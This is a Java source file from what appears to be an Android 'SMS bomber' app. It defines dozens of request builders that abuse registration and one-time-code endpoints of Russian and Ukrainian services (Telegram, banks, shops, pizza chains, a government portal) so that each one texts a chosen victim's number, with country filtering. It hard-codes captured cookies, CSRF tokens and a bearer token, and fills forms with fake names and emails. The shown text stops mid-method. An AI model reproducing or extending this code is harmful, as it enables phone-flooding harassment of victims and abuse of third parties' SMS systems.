package com.dm.bomber.services;

import androidx.annotation.NonNull;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;

import okhttp3.Call;
import okhttp3.FormBody;
import okhttp3.HttpUrl;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class Services {

    private static boolean contains(final int[] array, final int key) {
        for (final int i : array) {
            if (i == key) {
                return true;
            }
        }
        return false;
    }

    public static List<Service> getUsableServices(String countryCode) {
        List<Service> usableServices = new ArrayList<>();

        int countryCodeNum = countryCode.isEmpty() ? 0 : Integer.parseInt(countryCode);
        for (Service service : services) {
            if (service.countryCodes == null || service.countryCodes.length == 0 || contains(service.countryCodes, countryCodeNum))
                usableServices.add(service);
        }

        return usableServices;
    }

    public final static Service[] services = new Service[]{
            new Telegram(), new Tele2TV(),
            new Ukrzoloto(), new Olltv(), new ProstoTV(), new Groshivsim(),
            new Dolyame(), new Tinkoff(), new Gosuslugi(), new Multiplex(), new Evotor(), new MosMetro(), new BCS(),
            new Uchiru(), new Biua(), new MdFashion(), new RiveGauche(),
            new XtraTV(), new AlloUa(), new Rulybka(),
            new Technopark(), new Call2Friends(),
            new BeriZaryad(), new Labirint(), new SatUa(),
            new Melzdrav(), new Fonbet(), new Grilnica(),
            new Soscredit(), new ChernovtsyRabota(), new Eva(), new Apteka(),

            new ParamsService("https://findclone.ru/register") {
                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addQueryParameter("phone", getFormattedPhone());
                }
            },

            new FormService("https://polza.diet/sessions", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("utf8", "✓");
                    builder.add("authenticity_token", "RDB0iQ+dXYBLIvabyeAnf2fYEYnaMoMwINvwl/CS6HRz467tucU+kT6I7QTl7aWebeX8Gqtg48NYUUif1NJL9g==");
                    builder.add("phone", format(phone, "+7+(***)+***+**+**"));
                }
            },

            new FormService("https://shop.vodovoz-spb.ru/bitrix/tools/ajax_sms.php", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("phone", format(phone, "+7 (***) ***-**-**"));
                }
            },

            new FormService("https://chuck-family.ru/s/get-registration-confirm-code.json", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("register_phone", format(phone, "8+***-***-**-**"));
                    builder.add("register_name", getRussianName());
                    builder.add("register_birthday", "01.01.1981");
                    builder.add("", "");
                }
            },

            new ParamsService("https://vsem-edu-oblako.ru/singlemerchant/api/sendconfirmationcode", 7) {
                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addQueryParameter("lang", "ru");
                    builder.addQueryParameter("json", "true");
                    builder.addQueryParameter("merchant_keys", "b27447ba613046d3659f9730ccf15e3c");
                    builder.addQueryParameter("device_id", "f330883f-b829-41df-83f5-7e263b780e0e");
                    builder.addQueryParameter("device_platform", "desktop");
                    builder.addQueryParameter("phone", format(phone, "+7 (***) ***-**-**"));
                }
            },

            new FormService("https://novayagollandiya.com/auth/?backurl=/personal/", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("component", "bxmaker.authuserphone.login");
                    builder.add("sessid", "624313ea9d90eac9093d49000c8e2dbf");
                    builder.add("method", "sendCode");
                    builder.add("phone", format(phone, "+7+(***)-***-**-**"));
                    builder.add("registration", "N");
                }
            },

            new JsonService("https://api.sunlight.net/v3/customers/authorization/") {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://www.letu.ru/s/api/user/account/v1/confirmations/phone?pushSite=storeMobileRU", 7) {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("captcha", "");
                        json.put("phoneNumber", format(phone, "+7 (***) ***-**-**"));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://cnt-vlmr-itv02.svc.iptv.rt.ru/api/v2/portal/send_sms_code") {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("session_id", "24f8bbf7-60d3-11ec-b71d-4857027601a0:1951416:2237006:2");
                    return super.buildRequest(builder);
                }

                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("action", "register");
                        json.put("phone", getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new Service(7) {
                @Override
                public void run(OkHttpClient client, Callback callback) {
                    String formattedPhone = format(phone, "+7 (***) ***-**-**");

                    client.newCall(new Request.Builder()
                            .url("https://madrobots.ru/api/auth/register/")
                            .post(new FormBody.Builder()
                                    .add("name", getRussianName())
                                    .add("lastName", getRussianName())
                                    .add("phone", formattedPhone)
                                    .add("email", getEmail())
                                    .add("city", getRussianName())
                                    .add("subscribe", "0")
                                    .build())
                            .build()).enqueue(new okhttp3.Callback() {
                        @Override
                        public void onFailure(@NonNull Call call, @NonNull IOException e) {
                            callback.onFailure(call, e);
                        }

                        @Override
                        public void onResponse(@NonNull Call call, @NonNull Response response) {
                            client.newCall(new Request.Builder()
                                    .url("https://madrobots.ru/api/auth/send-code/")
                                    .post(new FormBody.Builder()
                                            .add("identifier", formattedPhone)
                                            .build())
                                    .build()).enqueue(callback);
                        }
                    });
                }
            },

            new Service(380) {
                @Override
                public void run(OkHttpClient client, Callback callback) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("msisdn", getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    client.newCall(new Request.Builder()
                            .url("https://mnp.lifecell.ua/mnp/get-token/")
                            .post(RequestBody.create(json.toString(), MediaType.parse("application/json")))
                            .build()).enqueue(new okhttp3.Callback() {
                        @Override
                        public void onFailure(@NonNull Call call, @NonNull IOException e) {

                        }

                        @Override
                        public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                            try {
                                JSONObject req = new JSONObject(Objects.requireNonNull(response.body()).string());

                                JSONObject json = new JSONObject();
                                json.put("contact", getFormattedPhone());
                                json.put("otp_type", "standart");

                                client.newCall(new Request.Builder()
                                        .url("https://mnp.lifecell.ua/mnp/otp/send/")
                                        .header("authorization", "Token " + req.getString("token"))
                                        .post(RequestBody.create(json.toString(), MediaType.parse("application/json")))
                                        .build()).enqueue(callback);

                            } catch (JSONException | NullPointerException e) {
                                callback.onError(e);
                            }
                        }
                    });
                }
            },

            new FormService("https://uss.rozetka.com.ua/session/auth/signup-phone", 380) {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("Cookie", "ab-cart-se=new; xab_segment=123; slang=ru; uid=rB4eDGHMb00wHeQls7l4Ag==; visitor_city=1; _uss-csrf=zfILVt2Lk9ea1KoFpg6LVnxCivNV1mff+ZDbpC0kSK9c/K/5; ussat_exp=1640830991; ussat=8201437cececef15030d16966efa914d.ua-a559ca63edf16a11f148038356f6ac94.1640830991; ussrt=6527028eb43574da97a51f66ef50c5d0.ua-a559ca63edf16a11f148038356f6ac94.1643379791; ussapp=u3-u_ZIf2pBPN8Y6oGYIQZLBN4LUkQgplA_Dy2IX; uss_evoid_cascade=no");
                    builder.addHeader("Csrf-Token", "zfILVt2Lk9ea1KoFpg6LVnxCivNV1mff+ZDbpC0kSK9c/K/5");

                    return super.buildRequest(builder);
                }

                @Override
                public void buildBody(FormBody.Builder builder) {
                    String name = getRussianName();

                    builder.add("title", name);
                    builder.add("first_name", name);
                    builder.add("last_name", getRussianName());
                    builder.add("password", getUserName() + "A123");
                    builder.add("email", getEmail());
                    builder.add("phone", phone);
                    builder.add("request_token", "rB4eDGHMb00wHeQls7l4Ag==");
                }
            },

            new FormService("https://happywear.ru/index.php?route=module/registerformbox/ajaxCheckEmail", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("email", getEmail());
                    builder.add("telephone", format(phone, "7(***)***-**-**"));
                    builder.add("password", "qVVwa6QwcaCPP2s");
                    builder.add("confirm", "qVVwa6QwcaCPP2s");
                }
            },

            new ParamsService("https://www.sportmaster.ua/?module=users&action=SendSMSReg", 380) {
                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addQueryParameter("phone", getFormattedPhone());
                }
            },

            new FormService("https://yaro.ua/assets/components/office/action.php", 380) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("action", "authcustom/formRegister");
                    builder.add("mobilephone", getFormattedPhone());
                    builder.add("pageId", "116");
                    builder.add("csrf", "b1618ecce3d6e49833f9d9c8c93f9c53");
                }
            },

            new JsonService("https://api.01.hungrygator.ru/web/auth/webotp", 7) {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("userLogin", format(phone, "+7 (***) ***-**-**"));
                        json.put("fu", "bar");
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new FormService("https://feelka.kz/profile/login/send") {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("Cookie", "user_hash=ffc14dcb317a5b139628375691cdac011d57031e7d11202e9653dba1be0b5b9ca%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22user_hash%22%3Bi%3A1%3Bs%3A32%3A%22d423303a4450353ff218a06c6537ec31%22%3B%7D; city_id=77ad4b65fd4265fc1665cf2363f3dc0e2a04349899f28df8a539d41dfccc02e4a%3A2%3A%7Bi%3A0%3Bs%3A7%3A%22city_id%22%3Bi%3A1%3Bs%3A1%3A%221%22%3B%7D; city_folder=d9aef6fa22b07d343f480bd79d0327fcb82aa359e7c8ec3f5e5ba396b3c2ffbaa%3A2%3A%7Bi%3A0%3Bs%3A11%3A%22city_folder%22%3Bi%3A1%3Bs%3A0%3A%22%22%3B%7D");

                    return super.buildRequest(builder);
                }

                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("phone", getFormattedPhone());
                    builder.add("xhr", "e3f365d8e3c26bf23a783e3ef2284426b7cf54062d5198b7d82ebf29812159fd");
                }
            },

            new FormService("https://coffeemania.ru/login", 7) {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("Cookie", "advanced-frontend=249af0fec8eba234a5073a8b2b4b669c; usertoken=0dd71cf26a60cde974fccea7cbf4b1cc7fef6b42f5ae1a90931ab02a97f634f9a%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22usertoken%22%3Bi%3A1%3Bs%3A20%3A%22BUgLuZWPOYpqpTzfedEY%22%3B%7D; _csrf-frontend=8ec96385efe9d0b6692a0e20f48242093099e01e8c3e6421880f123f0c0c3c1aa%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22aHlaJkh2k2DM8fPsDxNfearHyYM7a-EF%22%3B%7D;");
                    builder.addHeader("X-CSRF-Token", "oRDK7RaJ4l1phEUjnxKBTVWBOMthFfRRMHQu12jdFrHAWKaMXOKKbwK2AW6ndNE-Efl2rQR0hhlJLWPgCfBT9w==");

                    return super.buildRequest(builder);
                }

                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("_csrf-frontend", "ErLX8KCUbLFIDYTf3Mc9ZA2mgNEXIC4iUNuFeTeFuxtz-ruR6v8EgyM_wJLkoW0XSd7Ot3JBXGopgshOVqj-XQ==");
                    builder.add("LoginForm[phone]", format(phone, "+7(***)***-**-**"));
                    builder.add("LoginForm[type]", "");
                }
            },

            new ParamsService("https://www.winelab.ru/login/send/confirmationcode", 7) {
                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addQueryParameter("number", format(phone, "7(***)***-**-**"));
                    builder.addQueryParameter("_", "1646757906656");
                }
            },

            new FormService("https://samurai.ru/local/ajax/login_reg.php", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("user_tel", format(phone, "+7 (***) ***-**-**"));
                    builder.add("user_password", getUserName());
                    builder.add("do", "reg");
                }
            },

            new FormService("https://sushiicons.com.ua/kiev/index.php?route=common/cart/ajaxgetcoderegister", 380) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("firstname", getRussianName());
                    builder.add("phone", format(phone, "+380 (**) ***-**-**"));
                    builder.add("birthday", "2005-03-05");
                }
            },

            new JsonService("https://ucb.z.apteka24.ua/api/send/otp") {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://mob-app.rolf.ru/api/v4/auth/register/request-sms-code") {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("accept-language", "uk");
                    builder.addHeader("accept-encoding", "gzip");
                    builder.addHeader("user-agent", "okhttp/3.14.9");

                    return super.buildRequest(builder);
                }

                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://e-solution.pickpoint.ru/mobileapi/17100/sendsmscode") {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("User-Agent", "Application name: pickpoint_android, Android version: 29, Device model: Mi 9T Pro (raphael), App version name: 3.9.0, App version code: 69, App flavor: , Build type: release");
                    builder.addHeader("Connection", "Keep-Alive");
                    builder.addHeader("Accept-Encoding", "gzip");

                    return super.buildRequest(builder);
                }

                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("PhoneNumber", getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://xn--80adjkr6adm9b.xn--p1ai/api/v5/user/start-authorization", 7) {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", format(phone, "+7 *** ***-**-**"));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new ParamsService("https://fe.dominospizza.ru/api/authentication/sendVerificationSms", "POST", 7) {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("authorization", "Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIn0.lk7imFwFM9_w7KDujmn0jxArTGubuk-GZOw2r-RGAGeV1BDiFJZJzQ.AFBzB-1QZo01LFVo-c1X6w.7YADNKglX4DWWqFyz09vl9ze0KySLLHiDvIiQYef02c_kmrDnFBmPKibAR5EVREzZRTmN4sJ6lFNwYLeMtOaqrNWyJGz3zcYoahvjcjB5B9mCfLcVX1ugbCvYpbimvACn4P613afErS_0VvShR8vsdv3T3z6q5qx3w9CmuDLkzUUnqJ8BvO8kafNQQsUhZ6vJBoxv6cLf4UKNzHwGFU84g6kx2aBP2jJV8H6bpzbRqRsGWKWxb46ZKW01Cs5-BesuhNN25euWpY4uwYkM0Lqz6UX9_Hu0b7cZyH6JOy_H_y6aHZm1mZdiWex_FSbIf6it2_oZgsRFQLMPRqwfl9JXeCLrtaXipbwUjrFvaOC3pnEgYZ_y0iiCgse_i1tneeHgwQm7sjM7qEskqLPkqXOe2rCqn3mjFtfMAw95nrOXPQQ38UqEAdWUvDJDh141WYLw-wLfKjONldE0b-dNk5coKeptItF-0abCWgq6s6giAs.JZ-M2bpaATtWYaLPm3-hqA");

                    return super.buildRequest(builder);
                }

                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addQueryParameter("phoneNumber", phone);
                }
            },

            new ParamsService("https://m.avtoall.ru/cart/order/api/phone", 7) {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("Cookie", "PHPSESSID3=1lld5u0hic440f37ilipkcaq71; out_location_data=C%3A15%3A%22OutLocationData%22%3A48%3A%7Ba%3A2%3A%7Bs%3A10%3A%22locationId%22%3Bb%3A0%3Bs%3A9%3A%22confirmed%22%3Bb%3A0%3B%7D%7D; split=split-a; _ga=GA1.2.876559525.1644854748; _gid=GA1.2.144615146.1644854748; _ym_uid=1644854749375021234; _ym_d=1644854749; lastHost=m.avtoall.ru; _ym_isad=2; _dn_sid=ee0c8210-3e11-4fed-ba9f-05ed60687722; location_data=C%3A12%3A%22LocationData%22%3A55%3A%7Ba%3A2%3A%7Bs%3A10%3A%22locationId%22%3Bs%3A4%3A%222941%22%3Bs%3A9%3A%22confirmed%22%3Bb%3A1%3B%7D%7D");

                    return super.buildRequest(builder);
                }

                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addQueryParameter("phone", format(phone, "+7 (***) ***-****"));
                    builder.addQueryParameter("key", "51df7fb4cfc3e8e518fa346710b7712e");
                }
            },

            new JsonService("https://api.raketaapp.com/v1/auth/otps?ngsw-bypass=true") {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new ParamsService("https://c.ua/index.php?route=account/loginapples/sendSMS", 380) {
                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addQueryParameter("route", "account/loginapples/sendSMS");
                    builder.addQueryParameter("phone", "0" + phone);
                }
            },

            new FormService("https://client.taximaxim.com/ru-RU/site/send-code/?tax-id=yFL33BWu8yOEhqH0C0bV8BfGWKFjFba7Sxdwcdfppe71sHd4uxidkbS5%2B%2BYzBsW%2BiAH1yXFh2Na5bJdvZaNNTNRa6w%2BY1xpwqd1XUGEIcJc%3D", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("_csrf", "kxA-oV0mlFWdBCIB7ILw3rimGOLKolF08U3T-xRAHODhR27nE3LDANN1Flmt27uT7tZVpqHsJhCmAJ-OLAMurw==");
                    builder.add("LoginForm[org]", "maxim");
                    builder.add("LoginForm[country]", "KZ");
                    builder.add("LoginForm[baseId]", "2647");
                    builder.add("LoginForm[phone]", format(phone, "+7(***)***-**-**"));
                    builder.add("LoginForm[code]", "");
                    builder.add("LoginForm[sendCodeType]", "0");
                }

                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("Cookie", "_gcl_au=1.1.1590444723.1644943405; ga4_ga=GA1.1.1194255158.1644943405; _fbp=fb.1.1644943405522.1545141459; tmr_lvid=240c8ea73522f433a343f40b415fe8da; tmr_lvidTS=1644943405689; _ga=GA1.2.1194255158.1644943405; _gid=GA1.2.856429364.1644943406; _gat=1; _ym_uid=1644943406270600745; _ym_d=1644943406; _ym_isad=2; _ym_visorc=w; TAXSEE_V3MAXIM=l3thvebia464dbs2koje0n3hgv; __finger_print_hash=6e47d4b191dc6ac30a1d7606a5fa7a7a72cb20cc9e0853935099d982901443b9a%3A2%3A%7Bi%3A0%3Bs%3A19%3A%22__finger_print_hash%22%3Bi%3A1%3Bs%3A32%3A%2264d178a6ae165b1da838d27d84a1e244%22%3B%7D; __intl=1a6c3f19d825211b4b399b7960038c6d1a93438adf1deb9825ed10de11d478f0a%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22__intl%22%3Bi%3A1%3Bs%3A5%3A%22ru-RU%22%3B%7D; _csrf=d92a7efa1c07f1ffe242d52d34c2845fc5430ca22a0a772cb9ff56f9528cb7faa%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22rWPFNTWUNq4XAYKMVpMDkNwdWMLu8C2O%22%3B%7D; ga4_ga_21NZZ0KWNK=GS1.1.1644943405.1.1.1644943408.57; tmr_reqNum=4");
                    builder.addHeader("X-CSRF-Token", "kxA-oV0mlFWdBCIB7ILw3rimGOLKolF08U3T-xRAHODhR27nE3LDANN1Flmt27uT7tZVpqHsJhCmAJ-OLAMurw==");

                    return super.buildRequest(builder);
                }
            },

            new Service(7) {
                @Override
                public void run(OkHttpClient client, Callback callback) {
                    client.newCall(new Request.Builder()
                            .url("https://api.pizzasan.ru/api/clients/do_register")
                            .post(RequestBody.create("------WebKitFormBoundaryVtaTywrDHtBorVsK\n" +
                                    "Content-Disposition: form-data; name=\"name\"\n" +
                                    "\n" +
                                    "\n" +
                                    "------WebKitFormBoundaryVtaTywrDHtBorVsK\n" +
                                    "Content-Disposition: form-data; name=\"phone\"\n" +
                                    "\n" +
                                    format(phone, "8(***) ***-****") +
                                    "\n------WebKitFormBoundaryVtaTywrDHtBorVsK\n" +
                                    "Content-Disposition: form-data; name=\"password\"\n" +
                                    "\n" +
                                    "1234567\n" +
                                    "------WebKitFormBoundaryVtaTywrDHtBorVsK\n" +
                                    "Content-Disposition: form-data; name=\"password_2\"\n" +
                                    "\n" +
                                    "1234567\n" +
                                    "------WebKitFormBoundaryVtaTywrDHtBorVsK--", MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryVtaTywrDHtBorVsK")))
                            .build()).enqueue(callback);
                }
            },

            new FormService("https://luckycosmetics.ru/index.php?route=module/smsverification/generate", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("phone", format(phone, "+7 (***) ***-**-**"));
                    builder.add("registered", "0");
                }

                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("Cookie", "PHPSESSID=43jda9rgnctmidr9s4skhdskr1; _lucky_ident=7cc59b449f01cc6473162f381817b842; _lucky_uid=19717157; _ga=GA1.2.440536502.1648574015; _gid=GA1.2.1766371184.1648574015; _gat=1; tmr_lvid=0db3fa1830a9673dcd291c816c94ff21; tmr_lvidTS=1648574015329; tmr_reqNum=3; _dc_gtm_UA-15256516-4=1; _fbp=fb.1.1648574015618.1527744418; _ym_uid=1648574016350694378; _ym_d=1648574016; _ym_isad=2; _ym_visorc=w; cto_bundle=Faosxl9EVnp3eW1hc29CWDhuNE95TmFkajFYNENVeVd0cndaeGdzaHR4OUFjNFhwNnVMSEhPcUF6bzc4WDNIUkxTeDc5dGRXMVZsSUZSTCUyRjRvMkp3TVF2MGROdVpCVDVnYk5MT2V6VThNVHQ2dHVSOE5aZlg5RkxGeVFKTnBjN2JaWE02bWN5YUplcUV5azlCYkIwYWZLcCUyQlNRJTNEJTNE; tmr_detect=0%7C1648574018130; language=ru; currency=RUB; banner_view=s1; banner_time=1648575819940");
                    builder.addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36 Edg/99.0.1150.550");
                    return super.buildRequest(builder);
                }
            },

            new FormService("https://www.kristall-shop.ru/ajaxer.php?x=personal", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("action", "sms_send");
                    builder.add("phone", format(phone, "+7 (***) ***-**-**"));
                    builder.add("csrf_token", "bf365b62acb4b358b42e38d45f060acf");
                }

                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("Cookie", "PHPSESSID=ksstkdlpk2qo7dgtcfjo6hup01; user_source=direct; user_id=24faa4ade96af13b1351fa01cd5b5a7b; user_type=client; city=1; _ga=GA1.2.2017371052.1648576559; _gid=GA1.2.1857337036.1648576559; _ym_uid=164857656046395673; _ym_d=1648576560; tmr_lvid=e8ab35ae3db9b36f8a001f6d153c8e62; tmr_lvidTS=1648576559651; _ym_isad=2; _ym_visorc=w; _lhtm_u=62432d0084bf4d7c0811aef7; _lhtm_r=direct|5fc5f2e04b0c685e1823b1e5; _fbp=fb.1.1648576560720.54969929; _ym_mailid=e9f2c96e4185b4e8fc4f10ce4b193ced; _gucid=fc4f10ce4b193cede9f2c96e4185b4e8; viewed_pages=2; cto_bundle=1gbT3193bGp5bXhncEU3NjJKQVlQcFp5VlZ0R1hKOEVmYURRaXowaWRjQ3NyMm9YWCUyRmVTQWV1YjNHREVPaEc4SmN5c3FtTmk3YjU5cmZMYmpuOGRvRFBXM3gwTzZ1cktnJTJGOXJ4RlM3eUk5dTNDWXBGRmglMkZLSVZvNTdYcnAlMkJOQjU5Tko1ekNXOVVOQkxhcVczdXNMV1I0WjNUUSUzRCUzRA; lh_widget_system_pages_counter=1; tmr_detect=0%7C1648576565533; tmr_reqNum=7");

                    return super.buildRequest(builder);
                }
            },

            new FormService("https://www.banki.ru/ng/api/v1.0/public/auth/send-otp/") {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("phone", "+" + getFormattedPhone());
                    builder.add("isRulesAccepted", "true");
                    builder.add("isAdAccepted", "false");
                }
            },

            new FormService("https://zvonok.com/api/demo/", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("csrfmiddlewaretoken", "IR473RdCuTdFJyh1O2PXgiiYrI6DNQFmHiagLFAXOsMlDMdh2DsxuZuEEeOT3kCs");
                    builder.add("type", "confirm");
                    builder.add("phone", format(phone, "+7 (***)***-**-**"));
                }
            },

            new Service() {
                @Override
                public void run(OkHttpClient client, Callback callback) {
                    client.newCall(new Request.Builder()
                            .url("https://tv.yota.ru/")
                            .get().build()).enqueue(new okhttp3.Callback() {
                        @Override
                        public void onFailure(@NonNull Call call, @NonNull IOException e) {
                            callback.onFailure(call, e);
                        }

                        @Override
                        public void onResponse(@NonNull Call call, @NonNull Response response) {
                            JSONObject json = new JSONObject();

                            try {
                                json.put("msisdn", getFormattedPhone());
                                json.put("password", "91234657");
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }

                            try {
                                client.newCall(new Request.Builder()
                                        .url("https://bmp.tv.yota.ru/api/v10/auth/register/msisdn")
                                        .addHeader("Cookie", response.header("Set-Cookie").split(";")[0])
                                        .post(RequestBody.create(
                                                json.toString(), MediaType.parse("application/json")))
                                        .build()).enqueue(callback);
                            } catch (NullPointerException e) {
                                callback.onError(e);
                            }
                        }
                    });
                }
            },

            new Service() {
                @Override
                public void run(OkHttpClient client, Callback callback) {
                    client.newCall(new Request.Builder()
                            .url("https://megafon.tv")
                            .get().build()).enqueue(new okhttp3.Callback() {
                        @Override
                        public void onFailure(@NonNull Call call, @NonNull IOException e) {
                            callback.onFailure(call, e);
                        }

                        @Override
                        public void onResponse(@NonNull Call call, @NonNull Response response) {
                            JSONObject json = new JSONObject();

                            try {
                                json.put("msisdn", getFormattedPhone());
                                json.put("password", "91234657");
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }

                            try {
                                client.newCall(new Request.Builder()
                                        .url("https://bmp.megafon.tv/api/v10/auth/register/msisdn")
                                        .addHeader("Cookie", response.header("Set-Cookie").split(";")[0])
                                        .post(RequestBody.create(
                                                json.toString(), MediaType.parse("application/json")))
                                        .build()).enqueue(callback);
                            } catch (NullPointerException e) {
                                callback.onError(e);
                            }
                        }
                    });
                }
            },

            new FormService("https://yaponchik.net/login/login_.php", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("login", "Y");
                    builder.add("countdown", "0");
                    builder.add("step", "phone");
                    builder.add("redirect", "/profile/");
                    builder.add("phone", format(phone, "+7 (***) ***-**-**"));
                }

                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.header("x-requested-with", "XMLHttpRequest");

                    return super.buildRequest(builder);
                }
            },

            new FormService("https://luckycosmetics.ru/index.php?route=module/smsverification/createcode", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("phone", format(phone, "+7 ***-***-**-**"));
                    builder.add("registered", "0");
                }

                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.header("Cookie", "_ym_d=1648574016; _ym_uid=1648574016350694378; PHPSESSID=s81s1p6dhvtml4202c9ukipr04; _lucky_ident=f75be0590f0ff3f7fc98d875424a2916; _lucky_uid=20006300; tmr_lvid=0db3fa1830a9673dcd291c816c94ff21; tmr_lvidTS=1648574015329; _ga=GA1.2.1616716533.1651899862; _gid=GA1.2.952929180.1651899862; _gat=1; _dc_gtm_UA-15256516-4=1; cto_bundle=f2uhI19ZR1dsYjU2MXE3dFUyU3E1UXlPUm9mTWFPbzBicVg5Qk5VWWZkMDglMkY5RFhSVUFldmFzTkpqNUZlRGNVOUIlMkZyOW1LQmtDS1pocjdVMGpJQUpxcDRhOHRCWlZ3UDlOM2hOc3JuNHVDYyUyQlNzJTJGdmVNaGpkemZVNVlUTTNGbWRaNnY5MlNSaUU2eVJXZ3RSYSUyRmNSUGJ5NkZRJTNEJTNE; _ym_isad=2; _ym_visorc=w; tmr_detect=0%7C1651899865822; language=ru; currency=RUB; geoip_fias_id=3278; banner_view=s1; banner_time=1651901667823; tmr_reqNum=10");
                    builder.header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36 Edg/101.0.1210.32");
                    builder.header("X-Requested-With", "XMLHttpRequest");

                    return super.buildRequest(builder);
                }
            },

            new FormService("https://almazholding.ru/local/user1/sendcode.php") {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("PHONE", getFormattedPhone());
                    builder.add("ECAPTCHA", "undefined");
                }
            },

            new FormService("https://www.freak-butik.ru//class/ajax/client.php") {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("command", "getsmscode");
                    builder.add("phone", getFormattedPhone());
                }

                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36 Edg/101.0.1210.32");

                    return super.buildRequest(builder);
                }
            },

            new JsonService("https://severx.ru/api/auth/code") {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

